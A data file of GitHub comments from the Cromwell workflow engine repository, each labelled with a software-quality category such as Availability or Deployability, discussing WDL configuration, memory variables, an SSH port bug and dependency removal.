https://github.com/broadinstitute/cromwell/pull/6762#issuecomment-2107730127:395,Deployability,update,update,395,"Makes sense. This can wait for the official announcement of which way the feature is going. In the meantime, our users are gradually migrating from on-prem to Terra. Our Cromwell instance allows users to run workflows on GCP or GridEngine. We want to ensure our instance has feature parity with launching workflows in Terra, so we needed something like this commit. After the announcement, I'll update the PR to copy these auth config lines over to the Batch backend. Otherwise, Terra will have removed the checkbox for reference disks and we can close the PR.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6762#issuecomment-2107730127
https://github.com/broadinstitute/cromwell/pull/6762#issuecomment-2107730127:428,Modifiability,config,config,428,"Makes sense. This can wait for the official announcement of which way the feature is going. In the meantime, our users are gradually migrating from on-prem to Terra. Our Cromwell instance allows users to run workflows on GCP or GridEngine. We want to ensure our instance has feature parity with launching workflows in Terra, so we needed something like this commit. After the announcement, I'll update the PR to copy these auth config lines over to the Batch backend. Otherwise, Terra will have removed the checkbox for reference disks and we can close the PR.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6762#issuecomment-2107730127
https://github.com/broadinstitute/cromwell/pull/6763#issuecomment-1127173992:45,Performance,cache,cached,45,The wrong paths were being returned for call cached detritus from the `/logs` endpoint.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6763#issuecomment-1127173992
https://github.com/broadinstitute/cromwell/pull/6763#issuecomment-1127173992:72,Testability,log,logs,72,The wrong paths were being returned for call cached detritus from the `/logs` endpoint.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6763#issuecomment-1127173992
https://github.com/broadinstitute/cromwell/pull/6766#issuecomment-1133753430:184,Availability,avail,available,184,"To effectively use ""Retry with More Memory"" for JVM jobs running on Papi one has to use `MEM_SIZE` and `MEM_UNIT` to run with the correct memory settings. But those variables were not available on any other backends. Therefore one ended up having to use other creative options for [authoring multi-backend WDL](https://github.com/broadinstitute/warp/issues/481) such as using [`free`](https://github.com/broadinstitute/warp/pull/197/files/ae14bee73c07684b97dad22b8f3de53ff6404afe..f0692505010baa576f9fe09578fa001661a55145#r735883251). This PR exposes those two environment variables to the `command` block on any Cromwell ""standard"" backend that supports the `memory` runtime attribute. Using the environment variables also helps with call caching java jobs. One can use something along the lines of `-Xmx${MEM_SIZE%.*}${MEM_UNIT%?}` in a version 1.0+ WDL and the command block will stay the same even if the memory needs to be increased. <hr/>. Side note: If anyone comes across this PR and wonders why the default `Local` backend doesn't support `MEM_SIZE` and `MEM_UNIT` it's because the Local backend does not use `memory` (nor `cpu` at the moment). The `memory` runtime attribute would need to be added into the [runtime attributes](https://github.com/broadinstitute/cromwell/blob/79/core/src/main/resources/reference_local_provider_config.inc.conf#L9-L12) with something like:. ```hocon; runtime-attributes = """"""; String? docker; String? docker_user; Int memory_mb = 2048; """"""; ```. And then inside [`submit-docker`](https://github.com/broadinstitute/cromwell/blob/79/core/src/main/resources/reference_local_provider_config.inc.conf#L14-L34) use `--memory=${memory_mb}m`. Then the changes in this PR will generate `MEM_SIZE` and `MEM_UNIT` for the Local backend too.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6766#issuecomment-1133753430
https://github.com/broadinstitute/cromwell/pull/6766#issuecomment-1133753430:165,Modifiability,variab,variables,165,"To effectively use ""Retry with More Memory"" for JVM jobs running on Papi one has to use `MEM_SIZE` and `MEM_UNIT` to run with the correct memory settings. But those variables were not available on any other backends. Therefore one ended up having to use other creative options for [authoring multi-backend WDL](https://github.com/broadinstitute/warp/issues/481) such as using [`free`](https://github.com/broadinstitute/warp/pull/197/files/ae14bee73c07684b97dad22b8f3de53ff6404afe..f0692505010baa576f9fe09578fa001661a55145#r735883251). This PR exposes those two environment variables to the `command` block on any Cromwell ""standard"" backend that supports the `memory` runtime attribute. Using the environment variables also helps with call caching java jobs. One can use something along the lines of `-Xmx${MEM_SIZE%.*}${MEM_UNIT%?}` in a version 1.0+ WDL and the command block will stay the same even if the memory needs to be increased. <hr/>. Side note: If anyone comes across this PR and wonders why the default `Local` backend doesn't support `MEM_SIZE` and `MEM_UNIT` it's because the Local backend does not use `memory` (nor `cpu` at the moment). The `memory` runtime attribute would need to be added into the [runtime attributes](https://github.com/broadinstitute/cromwell/blob/79/core/src/main/resources/reference_local_provider_config.inc.conf#L9-L12) with something like:. ```hocon; runtime-attributes = """"""; String? docker; String? docker_user; Int memory_mb = 2048; """"""; ```. And then inside [`submit-docker`](https://github.com/broadinstitute/cromwell/blob/79/core/src/main/resources/reference_local_provider_config.inc.conf#L14-L34) use `--memory=${memory_mb}m`. Then the changes in this PR will generate `MEM_SIZE` and `MEM_UNIT` for the Local backend too.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6766#issuecomment-1133753430
https://github.com/broadinstitute/cromwell/pull/6766#issuecomment-1133753430:573,Modifiability,variab,variables,573,"To effectively use ""Retry with More Memory"" for JVM jobs running on Papi one has to use `MEM_SIZE` and `MEM_UNIT` to run with the correct memory settings. But those variables were not available on any other backends. Therefore one ended up having to use other creative options for [authoring multi-backend WDL](https://github.com/broadinstitute/warp/issues/481) such as using [`free`](https://github.com/broadinstitute/warp/pull/197/files/ae14bee73c07684b97dad22b8f3de53ff6404afe..f0692505010baa576f9fe09578fa001661a55145#r735883251). This PR exposes those two environment variables to the `command` block on any Cromwell ""standard"" backend that supports the `memory` runtime attribute. Using the environment variables also helps with call caching java jobs. One can use something along the lines of `-Xmx${MEM_SIZE%.*}${MEM_UNIT%?}` in a version 1.0+ WDL and the command block will stay the same even if the memory needs to be increased. <hr/>. Side note: If anyone comes across this PR and wonders why the default `Local` backend doesn't support `MEM_SIZE` and `MEM_UNIT` it's because the Local backend does not use `memory` (nor `cpu` at the moment). The `memory` runtime attribute would need to be added into the [runtime attributes](https://github.com/broadinstitute/cromwell/blob/79/core/src/main/resources/reference_local_provider_config.inc.conf#L9-L12) with something like:. ```hocon; runtime-attributes = """"""; String? docker; String? docker_user; Int memory_mb = 2048; """"""; ```. And then inside [`submit-docker`](https://github.com/broadinstitute/cromwell/blob/79/core/src/main/resources/reference_local_provider_config.inc.conf#L14-L34) use `--memory=${memory_mb}m`. Then the changes in this PR will generate `MEM_SIZE` and `MEM_UNIT` for the Local backend too.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6766#issuecomment-1133753430
https://github.com/broadinstitute/cromwell/pull/6766#issuecomment-1133753430:709,Modifiability,variab,variables,709,"To effectively use ""Retry with More Memory"" for JVM jobs running on Papi one has to use `MEM_SIZE` and `MEM_UNIT` to run with the correct memory settings. But those variables were not available on any other backends. Therefore one ended up having to use other creative options for [authoring multi-backend WDL](https://github.com/broadinstitute/warp/issues/481) such as using [`free`](https://github.com/broadinstitute/warp/pull/197/files/ae14bee73c07684b97dad22b8f3de53ff6404afe..f0692505010baa576f9fe09578fa001661a55145#r735883251). This PR exposes those two environment variables to the `command` block on any Cromwell ""standard"" backend that supports the `memory` runtime attribute. Using the environment variables also helps with call caching java jobs. One can use something along the lines of `-Xmx${MEM_SIZE%.*}${MEM_UNIT%?}` in a version 1.0+ WDL and the command block will stay the same even if the memory needs to be increased. <hr/>. Side note: If anyone comes across this PR and wonders why the default `Local` backend doesn't support `MEM_SIZE` and `MEM_UNIT` it's because the Local backend does not use `memory` (nor `cpu` at the moment). The `memory` runtime attribute would need to be added into the [runtime attributes](https://github.com/broadinstitute/cromwell/blob/79/core/src/main/resources/reference_local_provider_config.inc.conf#L9-L12) with something like:. ```hocon; runtime-attributes = """"""; String? docker; String? docker_user; Int memory_mb = 2048; """"""; ```. And then inside [`submit-docker`](https://github.com/broadinstitute/cromwell/blob/79/core/src/main/resources/reference_local_provider_config.inc.conf#L14-L34) use `--memory=${memory_mb}m`. Then the changes in this PR will generate `MEM_SIZE` and `MEM_UNIT` for the Local backend too.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6766#issuecomment-1133753430
https://github.com/broadinstitute/cromwell/pull/6766#issuecomment-1133753430:543,Security,expose,exposes,543,"To effectively use ""Retry with More Memory"" for JVM jobs running on Papi one has to use `MEM_SIZE` and `MEM_UNIT` to run with the correct memory settings. But those variables were not available on any other backends. Therefore one ended up having to use other creative options for [authoring multi-backend WDL](https://github.com/broadinstitute/warp/issues/481) such as using [`free`](https://github.com/broadinstitute/warp/pull/197/files/ae14bee73c07684b97dad22b8f3de53ff6404afe..f0692505010baa576f9fe09578fa001661a55145#r735883251). This PR exposes those two environment variables to the `command` block on any Cromwell ""standard"" backend that supports the `memory` runtime attribute. Using the environment variables also helps with call caching java jobs. One can use something along the lines of `-Xmx${MEM_SIZE%.*}${MEM_UNIT%?}` in a version 1.0+ WDL and the command block will stay the same even if the memory needs to be increased. <hr/>. Side note: If anyone comes across this PR and wonders why the default `Local` backend doesn't support `MEM_SIZE` and `MEM_UNIT` it's because the Local backend does not use `memory` (nor `cpu` at the moment). The `memory` runtime attribute would need to be added into the [runtime attributes](https://github.com/broadinstitute/cromwell/blob/79/core/src/main/resources/reference_local_provider_config.inc.conf#L9-L12) with something like:. ```hocon; runtime-attributes = """"""; String? docker; String? docker_user; Int memory_mb = 2048; """"""; ```. And then inside [`submit-docker`](https://github.com/broadinstitute/cromwell/blob/79/core/src/main/resources/reference_local_provider_config.inc.conf#L14-L34) use `--memory=${memory_mb}m`. Then the changes in this PR will generate `MEM_SIZE` and `MEM_UNIT` for the Local backend too.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6766#issuecomment-1133753430
https://github.com/broadinstitute/cromwell/issues/6767#issuecomment-1134959939:159,Availability,error,errors,159,"WDL 1.0 and up [require a dedicated `inputs` section](https://github.com/openwdl/wdl/blob/main/versions/1.0/SPEC.md#workflow-inputs). You can easily find such errors when editing WDLs in IntelliJ (it will automatically suggest to install a WDL helper plugin). . <img width=""929"" alt=""Screen Shot 2022-05-23 at 1 39 42 PM"" src=""https://user-images.githubusercontent.com/1087943/169876581-2b2e91f3-16fe-4dcf-96bc-3af317eecbb5.png"">",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6767#issuecomment-1134959939
https://github.com/broadinstitute/cromwell/issues/6767#issuecomment-1134959939:230,Deployability,install,install,230,"WDL 1.0 and up [require a dedicated `inputs` section](https://github.com/openwdl/wdl/blob/main/versions/1.0/SPEC.md#workflow-inputs). You can easily find such errors when editing WDLs in IntelliJ (it will automatically suggest to install a WDL helper plugin). . <img width=""929"" alt=""Screen Shot 2022-05-23 at 1 39 42 PM"" src=""https://user-images.githubusercontent.com/1087943/169876581-2b2e91f3-16fe-4dcf-96bc-3af317eecbb5.png"">",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6767#issuecomment-1134959939
https://github.com/broadinstitute/cromwell/issues/6767#issuecomment-1134959939:251,Modifiability,plugin,plugin,251,"WDL 1.0 and up [require a dedicated `inputs` section](https://github.com/openwdl/wdl/blob/main/versions/1.0/SPEC.md#workflow-inputs). You can easily find such errors when editing WDLs in IntelliJ (it will automatically suggest to install a WDL helper plugin). . <img width=""929"" alt=""Screen Shot 2022-05-23 at 1 39 42 PM"" src=""https://user-images.githubusercontent.com/1087943/169876581-2b2e91f3-16fe-4dcf-96bc-3af317eecbb5.png"">",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6767#issuecomment-1134959939
https://github.com/broadinstitute/cromwell/issues/6767#issuecomment-1134986904:49,Availability,error,error,49,"Thank you for the quick reply, Adam!. I wish the error message was a little more helpful, but this was definitely the issue and I have it working now!! :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6767#issuecomment-1134986904
https://github.com/broadinstitute/cromwell/issues/6767#issuecomment-1134986904:55,Integrability,message,message,55,"Thank you for the quick reply, Adam!. I wish the error message was a little more helpful, but this was definitely the issue and I have it working now!! :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6767#issuecomment-1134986904
https://github.com/broadinstitute/cromwell/pull/6769#issuecomment-1138542829:17,Usability,simpl,simply,17,"I ran a job that simply sleeps for 120 seconds, then requested the timing diagram (""Before the fix""). Then I restarted Cromwell with the fix, and requested the timing diagram again (""After the fix""). Before the fix:; <img width=""940"" alt=""before fix"" src=""https://user-images.githubusercontent.com/5531017/170490489-f892596e-8770-41db-83df-2f6a8d0b859b.png"">. After the fix:; <img width=""940"" alt=""after fix"" src=""https://user-images.githubusercontent.com/5531017/170490551-d71fc7d8-c78d-4daa-ad11-d10a4a23db66.png"">. In the ""after the fix"" image, the purple bar is ""cromwell starting overhead"", and lasts about 60 seconds. The maroon bar is ""RunningJob"", and also last about 60 seconds. It seems like the Maroon bar should have also been ""RunningJob"".",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6769#issuecomment-1138542829
https://github.com/broadinstitute/cromwell/issues/6771#issuecomment-1138741894:47,Availability,error,error,47,"We have also seen the `address already in use` error. Are you saying that the error is false and we should ignore it?. If it is a real error, then it seems like we would want to continue seeing it, and have the workaround be turning off the SSH enablement option `enable_ssh_access` [0]. [0] https://cromwell.readthedocs.io/en/stable/wf_options/Google/",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6771#issuecomment-1138741894
https://github.com/broadinstitute/cromwell/issues/6771#issuecomment-1138741894:78,Availability,error,error,78,"We have also seen the `address already in use` error. Are you saying that the error is false and we should ignore it?. If it is a real error, then it seems like we would want to continue seeing it, and have the workaround be turning off the SSH enablement option `enable_ssh_access` [0]. [0] https://cromwell.readthedocs.io/en/stable/wf_options/Google/",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6771#issuecomment-1138741894
https://github.com/broadinstitute/cromwell/issues/6771#issuecomment-1138741894:135,Availability,error,error,135,"We have also seen the `address already in use` error. Are you saying that the error is false and we should ignore it?. If it is a real error, then it seems like we would want to continue seeing it, and have the workaround be turning off the SSH enablement option `enable_ssh_access` [0]. [0] https://cromwell.readthedocs.io/en/stable/wf_options/Google/",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6771#issuecomment-1138741894
https://github.com/broadinstitute/cromwell/issues/6771#issuecomment-1139961597:310,Availability,error,error,310,"> it seems like we would want to continue seeing it; @aednichols; The bug in Life Sci API is that the ssh server is supposed to be disabled on the VM, but in some cases it is not, causing the `address already in use` problem. Since the ssh server is not disabled, ssh access to the VM is in fact possible. The error then becomes meaningless: the dockerized ssh server is unrelated to the wdl workflow, and users can still ssh to the VM.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6771#issuecomment-1139961597
https://github.com/broadinstitute/cromwell/issues/6771#issuecomment-1139961597:268,Security,access,access,268,"> it seems like we would want to continue seeing it; @aednichols; The bug in Life Sci API is that the ssh server is supposed to be disabled on the VM, but in some cases it is not, causing the `address already in use` problem. Since the ssh server is not disabled, ssh access to the VM is in fact possible. The error then becomes meaningless: the dockerized ssh server is unrelated to the wdl workflow, and users can still ssh to the VM.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6771#issuecomment-1139961597
https://github.com/broadinstitute/cromwell/pull/6772#issuecomment-1158885803:62,Testability,test,test,62,"If this really does fix #6771, maybe one proves it works a CI test? Have folks talked about reverting #6728 in this PR?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6772#issuecomment-1158885803
https://github.com/broadinstitute/cromwell/issues/6774#issuecomment-1143939365:456,Deployability,pipeline,pipeline,456,"I think what you're running into is that the `endpoint-url` refers to where the Life Sciences / Genomics application _itself_ runs, which is different than where the compute VMs spin up. . You can try putting `us-west2` in the WDL runtime section, or in the workflow options JSON. Both of those should be readily Googleable in terms of documentation, if you get stuck definitely comment. > The location you specify is only used to store metadata about the pipeline operation. [Source.](https://cloud.google.com/life-sciences/docs/concepts/locations#available_locations)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6774#issuecomment-1143939365
https://github.com/broadinstitute/cromwell/pull/6777#issuecomment-1154398743:17,Testability,test,tests,17,"LGTM, though the tests seem a little unhappy?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6777#issuecomment-1154398743
https://github.com/broadinstitute/cromwell/pull/6779#issuecomment-1181771030:189,Availability,error,errors,189,"NOTE FOR REVIEWERS: I was hoping to get feedback for how to best implement `successHandler` located in `CromwellApiService.scala`. Passing it in the `askSubmit` function gives a variety of errors on github and in code. Put it before `case Success(w)` and I get an error in Github because of mismatched states. Put the handler anywhere else in the function and it's unreachable. Currently, only the `errorHandler` is being used in the `askSubmit` function. Do I need to implement the `successHandler` in the function? Or can I leave it as is?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6779#issuecomment-1181771030
https://github.com/broadinstitute/cromwell/pull/6779#issuecomment-1181771030:264,Availability,error,error,264,"NOTE FOR REVIEWERS: I was hoping to get feedback for how to best implement `successHandler` located in `CromwellApiService.scala`. Passing it in the `askSubmit` function gives a variety of errors on github and in code. Put it before `case Success(w)` and I get an error in Github because of mismatched states. Put the handler anywhere else in the function and it's unreachable. Currently, only the `errorHandler` is being used in the `askSubmit` function. Do I need to implement the `successHandler` in the function? Or can I leave it as is?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6779#issuecomment-1181771030
https://github.com/broadinstitute/cromwell/pull/6779#issuecomment-1181771030:399,Availability,error,errorHandler,399,"NOTE FOR REVIEWERS: I was hoping to get feedback for how to best implement `successHandler` located in `CromwellApiService.scala`. Passing it in the `askSubmit` function gives a variety of errors on github and in code. Put it before `case Success(w)` and I get an error in Github because of mismatched states. Put the handler anywhere else in the function and it's unreachable. Currently, only the `errorHandler` is being used in the `askSubmit` function. Do I need to implement the `successHandler` in the function? Or can I leave it as is?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6779#issuecomment-1181771030
https://github.com/broadinstitute/cromwell/pull/6779#issuecomment-1181771030:40,Usability,feedback,feedback,40,"NOTE FOR REVIEWERS: I was hoping to get feedback for how to best implement `successHandler` located in `CromwellApiService.scala`. Passing it in the `askSubmit` function gives a variety of errors on github and in code. Put it before `case Success(w)` and I get an error in Github because of mismatched states. Put the handler anywhere else in the function and it's unreachable. Currently, only the `errorHandler` is being used in the `askSubmit` function. Do I need to implement the `successHandler` in the function? Or can I leave it as is?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6779#issuecomment-1181771030
https://github.com/broadinstitute/cromwell/pull/6783#issuecomment-1171460886:46,Testability,test,test,46,"This is a doc-only change and did get a clean test run earlier, so I'm going to merge despite the continuing test weirdness.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6783#issuecomment-1171460886
https://github.com/broadinstitute/cromwell/pull/6783#issuecomment-1171460886:109,Testability,test,test,109,"This is a doc-only change and did get a clean test run earlier, so I'm going to merge despite the continuing test weirdness.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6783#issuecomment-1171460886
https://github.com/broadinstitute/cromwell/pull/6785#issuecomment-1175286890:112,Deployability,upgrade,upgrade,112,Bonus awesomeness – removing this backend nerfs the vulnerable JDOM dependency that we would [otherwise have to upgrade](https://broadworkbench.atlassian.net/browse/BW-1228). ```; root(develop)> | 81> whatDependsOn org.jdom jdom2 2.0.6; [info] org.jdom:jdom2:2.0.6; [info] +-com.aliyun.oss:aliyun-sdk-oss:3.14.0; [info] +-org.broadinstitute:cromwell-ossfilesystem_2.13:81-5f48ded-SNAP [S]; [info] ; [info] org.jdom:jdom2:2.0.6; [info] +-com.aliyun.oss:aliyun-sdk-oss:3.14.0; [info] +-org.broadinstitute:cromwell-ossfilesystem_2.13:81-5f48ded-SNAP [S]; [info] +-org.broadinstitute:cromwell-bcs-backend_2.13:81-5f48ded-SNAP [S]; [info] ; [info] org.jdom:jdom2:2.0.6; [info] +-com.aliyun.oss:aliyun-sdk-oss:3.14.0; [info] +-org.broadinstitute:cromwell-ossfilesystem_2.13:81-5f48ded-SNAP [S]; [info] +-org.broadinstitute:cromwell-engine_2.13:81-5f48ded-SNAP [S]; [info] ; [info] org.jdom:jdom2:2.0.6; [info] +-com.aliyun.oss:aliyun-sdk-oss:3.14.0; [info] +-org.broadinstitute:cromwell-ossfilesystem_2.13:81-5f48ded-SNAP [S]; [info] +-org.broadinstitute:cromwell-bcs-backend_2.13:81-5f48ded-SNAP [S]; [info] | +-org.broadinstitute:cromwell_2.13:81-5f48ded-SNAP [S]; [info] | ; [info] +-org.broadinstitute:cromwell-engine_2.13:81-5f48ded-SNAP [S]; [info] +-org.broadinstitute:cromwell_2.13:81-5f48ded-SNAP [S]; ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6785#issuecomment-1175286890
https://github.com/broadinstitute/cromwell/pull/6785#issuecomment-1175286890:68,Integrability,depend,dependency,68,Bonus awesomeness – removing this backend nerfs the vulnerable JDOM dependency that we would [otherwise have to upgrade](https://broadworkbench.atlassian.net/browse/BW-1228). ```; root(develop)> | 81> whatDependsOn org.jdom jdom2 2.0.6; [info] org.jdom:jdom2:2.0.6; [info] +-com.aliyun.oss:aliyun-sdk-oss:3.14.0; [info] +-org.broadinstitute:cromwell-ossfilesystem_2.13:81-5f48ded-SNAP [S]; [info] ; [info] org.jdom:jdom2:2.0.6; [info] +-com.aliyun.oss:aliyun-sdk-oss:3.14.0; [info] +-org.broadinstitute:cromwell-ossfilesystem_2.13:81-5f48ded-SNAP [S]; [info] +-org.broadinstitute:cromwell-bcs-backend_2.13:81-5f48ded-SNAP [S]; [info] ; [info] org.jdom:jdom2:2.0.6; [info] +-com.aliyun.oss:aliyun-sdk-oss:3.14.0; [info] +-org.broadinstitute:cromwell-ossfilesystem_2.13:81-5f48ded-SNAP [S]; [info] +-org.broadinstitute:cromwell-engine_2.13:81-5f48ded-SNAP [S]; [info] ; [info] org.jdom:jdom2:2.0.6; [info] +-com.aliyun.oss:aliyun-sdk-oss:3.14.0; [info] +-org.broadinstitute:cromwell-ossfilesystem_2.13:81-5f48ded-SNAP [S]; [info] +-org.broadinstitute:cromwell-bcs-backend_2.13:81-5f48ded-SNAP [S]; [info] | +-org.broadinstitute:cromwell_2.13:81-5f48ded-SNAP [S]; [info] | ; [info] +-org.broadinstitute:cromwell-engine_2.13:81-5f48ded-SNAP [S]; [info] +-org.broadinstitute:cromwell_2.13:81-5f48ded-SNAP [S]; ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6785#issuecomment-1175286890
https://github.com/broadinstitute/cromwell/pull/6785#issuecomment-1175368391:52,Integrability,depend,dependency,52,"I believe it is implicitly imported as a transitive dependency, which is to say we don't have any actual import statements for it... it will just disappear automagically with Alibaba.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6785#issuecomment-1175368391
https://github.com/broadinstitute/cromwell/issues/6789#issuecomment-1176425986:327,Testability,test,test,327,"It seems like the bug here is that cromwell accepts `sep` at all in this context, since it doesn't support it. Given the way the 1.0 WDL spec was created, I'm not sure if the current behavior is intentional or not -- there doesn't seem to be a reason why `sep` wouldn't be supported in any String Interpolation context. If you test this out with `miniwdl`, it says that `sep` is invalid outside of a command block in WDL 1.0. In WDL 1.1, it's supported in both contexts (using the new style `sep` operator), and miniwdl allows it. In any event, changing cromwell's behavior for WDL 1.0 doesn't seem likely at this point, so I think the best way forward is to add WDL 1.1 support to cromwell, which supports this and many other features.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6789#issuecomment-1176425986
https://github.com/broadinstitute/cromwell/issues/6789#issuecomment-1177975945:132,Availability,error,error,132,"That's true, from reading. >outside the command block, it has no affect. it does seem that it's an inadvertent no-op rather than an error. Good take!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6789#issuecomment-1177975945
https://github.com/broadinstitute/cromwell/pull/6794#issuecomment-1177813011:20,Deployability,release,released,20,"Oh funny, they just released 2.9.2 yesterday. I can give that a shot, this should wait until the release goes out anyway.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6794#issuecomment-1177813011
https://github.com/broadinstitute/cromwell/pull/6794#issuecomment-1177813011:97,Deployability,release,release,97,"Oh funny, they just released 2.9.2 yesterday. I can give that a shot, this should wait until the release goes out anyway.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6794#issuecomment-1177813011
https://github.com/broadinstitute/cromwell/issues/6796#issuecomment-1177961608:356,Deployability,pipeline,pipelines,356,"The [quick start tutorial](https://cromwell.readthedocs.io/en/stable/tutorials/FiveMinuteIntro/) uses. ```; java -jar cromwell-XY.jar [ ... ]; ```. so the `-jar` option would be the first thing to try. I also removed the potentially extraneous `cromwell` in `cromwell.jar cromwell run`:. ```; java -jar cromwell.jar -Dconfig.file=../config/LSF.conf run ../pipelines/bismark_pid.wdl -i ../pipelines/bismark_wgbs_pid.json; ```. If that doesn't work for you, feel free to reopen the issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6796#issuecomment-1177961608
https://github.com/broadinstitute/cromwell/issues/6796#issuecomment-1177961608:388,Deployability,pipeline,pipelines,388,"The [quick start tutorial](https://cromwell.readthedocs.io/en/stable/tutorials/FiveMinuteIntro/) uses. ```; java -jar cromwell-XY.jar [ ... ]; ```. so the `-jar` option would be the first thing to try. I also removed the potentially extraneous `cromwell` in `cromwell.jar cromwell run`:. ```; java -jar cromwell.jar -Dconfig.file=../config/LSF.conf run ../pipelines/bismark_pid.wdl -i ../pipelines/bismark_wgbs_pid.json; ```. If that doesn't work for you, feel free to reopen the issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6796#issuecomment-1177961608
https://github.com/broadinstitute/cromwell/issues/6796#issuecomment-1177961608:333,Modifiability,config,config,333,"The [quick start tutorial](https://cromwell.readthedocs.io/en/stable/tutorials/FiveMinuteIntro/) uses. ```; java -jar cromwell-XY.jar [ ... ]; ```. so the `-jar` option would be the first thing to try. I also removed the potentially extraneous `cromwell` in `cromwell.jar cromwell run`:. ```; java -jar cromwell.jar -Dconfig.file=../config/LSF.conf run ../pipelines/bismark_pid.wdl -i ../pipelines/bismark_wgbs_pid.json; ```. If that doesn't work for you, feel free to reopen the issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6796#issuecomment-1177961608
https://github.com/broadinstitute/cromwell/pull/6798#issuecomment-1181764470:10,Deployability,update,updated,10,Merged an updated version of this missing documentation (See #6800),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6798#issuecomment-1181764470
